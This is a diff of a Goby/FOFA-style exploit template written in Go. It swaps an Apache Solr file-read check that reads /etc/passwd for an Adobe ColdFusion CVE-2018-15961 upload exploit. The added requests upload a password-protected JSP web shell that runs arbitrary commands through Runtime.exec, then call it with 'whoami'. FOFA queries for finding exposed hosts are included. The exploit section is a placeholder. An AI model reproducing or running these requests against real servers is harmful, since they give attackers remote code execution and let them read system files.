@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Apache Solr 任意文件读取",
-  "Description": "",
+  "Name": "Adobe ColdFusion upload.cfm 任意文件上传漏洞 CVE-2018-15961",
+  "Description": "<p><span style=\"font-size: 16px;\">Adobe ColdFusion存在任意文件上传漏洞，通过漏洞攻击者可上传任意文件控制服务器</span><br></p>",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "app=\"APACHE-Solr\" || product=\"APACHE-Solr\"",
-  "GobyQuery": "app=\"APACHE-Solr\" || product=\"APACHE-Solr\"",
-  "Level": "3",
+  "FofaQuery": "app=\"Adobe-ColdFusion\" || product=\"Adobe-ColdFusion\"",
+  "GobyQuery": "app=\"Adobe-ColdFusion\" || product=\"Adobe-ColdFusion\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,47 +29,15 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
-        "follow_redirect": true,
-        "header": {},
-        "data_type": "text",
-        "data": ""
-      },
-      "ResponseTest": {
-        "type": "group",
-        "operation": "AND",
-        "checks": [
-          {
-            "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "responseHeader",
-            "bz": ""
-          }
-        ]
-      },
-      "SetVariable": [
-        "core_name|lastbody|regex|\"name\":\"(.*?)\""
-      ]
-    },
-    {
-      "Request": {
         "method": "POST",
-        "uri": "/solr/{{{core_name}}}/config",
+        "uri": "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm",
         "follow_redirect": true,
         "header": {
-          "Content-Type": "application/json"
+          "Content-Type": "multipart/form-data; boundary=e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0",
+          "Accept-Encoding": "gzip"
         },
         "data_type": "text",
-        "data": "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
+        "data": "--e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0\nContent-Disposition: form-data; name=\"file\"; filename=\"aabbcc.jsp\"\nContent-Type: application/octet-stream\n\n<%\n    if(\"01001\".equals(request.getParameter(\"pwd\"))){\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print(\"<pre>\");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print(\"</pre>\");\n    }\n%>\n\n--e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0\nContent-Disposition: form-data; name=\"path\"\n\npath\n--e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0--"
       },
       "ResponseTest": {
         "type": "group",
@@ -86,7 +54,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "responseHeader",
+            "value": "",
             "bz": ""
           }
         ]
@@ -95,42 +63,8 @@ func init() {
     },
     {
       "Request": {
-        "method": "POST",
-        "uri": "/solr/{{{core_name}}}/debug/dump?param=ContentStreams",
-        "follow_redirect": true,
-        "header": {},
-        "data_type": "text",
-        "data": "stream.url=file:///etc/passwd"
-      },
-      "ResponseTest": {
-        "type": "group",
-        "operation": "AND",
-        "checks": [
-          {
-            "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "root:",
-            "bz": ""
-          }
-        ]
-      },
-      "SetVariable": []
-    }
-  ],
-  "ExploitSteps": [
-    "AND",
-    {
-      "Request": {
         "method": "GET",
-        "uri": "",
+        "uri": "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/aabbcc.jsp?pwd=01001&i=whoami",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -159,10 +93,44 @@ func init() {
       "SetVariable": []
     }
   ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
   "Tags": [],
   "VulType": [],
   "CVEIDs": [
-    ""
+    "CVE-2018-15961"
   ],
   "CNNVD": [
     ""
@@ -173,16 +141,16 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Apache Solr 任意文件读取",
+      "Name": "Adobe ColdFusion upload.cfm 任意文件上传漏洞 CVE-2018-15961",
       "Product": "",
-      "Description": "",
+      "Description": "<p><span style=\"font-size: 16px;\">Adobe ColdFusion存在任意文件上传漏洞，通过漏洞攻击者可上传任意文件控制服务器</span><br></p>",
       "Recommendation": "",
       "Impact": "",
       "VulType": [],
       "Tags": []
     },
     "EN": {
-      "Name": "Apache Solr File Read",
+      "Name": "Adobe ColdFusion upload.cfm upload file",
       "Product": "",
       "Description": "",
       "Recommendation": "",
